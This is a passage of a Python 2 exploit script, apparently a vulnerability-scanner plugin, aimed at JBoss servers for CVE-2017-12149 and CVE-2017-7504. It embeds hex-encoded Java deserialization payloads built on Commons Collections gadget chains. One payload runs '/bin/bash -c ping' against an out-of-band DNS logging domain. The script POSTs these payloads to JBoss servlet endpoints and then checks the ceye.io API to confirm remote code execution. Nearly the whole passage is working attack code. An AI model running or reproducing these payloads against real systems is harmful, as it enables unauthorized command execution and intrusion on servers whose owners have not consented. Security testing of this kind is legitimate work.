    ping_verify='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f727571007e001a000000017671007e001a7371007e00137571007e0018000000017571007e0018000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f7269747971007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f746f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f746d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a000000017671007e00187371007e00137571007e00180000000174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e0018000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174001870696e6720{}2e{}71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'.format(name,domain)
    try:
        requests.post(url=query,data=ping_verify.decode('hex'),timeout=10)
    except BaseException as e:
        pass
    time.sleep(2)
    if ceye_dnslog(api_url, banner):
        return query
    return False


def cve_2017_7504(url):
    url = "http://" + url if '://' not in url else url.rstrip('/')
    banner=''.join([random.choice(letters) for i in range(4)])
    domain=ceye_domain.encode('hex')
    name=banner.encode('hex')
    api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(ceye_api, banner)
    query=url+'/jbossmq-httpil/HTTPServerILServlet'
    ping_verify='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000037400092f62696e2f626173687400022d6374001870696e6720{}2e{}740004657865637571007e001b000000017671007e002c737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'.format(name,domain)
    try:
        requests.post(url=query,data=ping_verify.decode('hex'),timeout=10)
    except BaseException as e:
        pass
    time.sleep(2)
    if ceye_dnslog(api_url, banner):
        return query
    return False


def poc(url):
    info = {}
    Jexws = jexws(url)
    CVE_2017_12149 = cve_2017_12149(url)
    CVE_2017_7504 =cve_2017_7504(url)
    if Jexws:
        for i in Jexws:
            if 'jexinv'in i:
                info.update({"JMXInvokerServlet": i})
            if 'jexws'in i:
                info.update({"web-console": i})
            if 'jexjmx'in i:
                info.update({"jmx-console": i})
    if CVE_2017_12149:
        info.update({"CVE_2017_12149": CVE_2017_12149})
    if CVE_2017_7504:
        info.update({"CVE_2017_7504": CVE_2017_7504})
    if len(info) > 0:
        return json.dumps(info, indent=2, ensure_ascii=False)
    else:
        return False


if __name__ == '__main__':
    print poc('http://127.0.0.1:8080')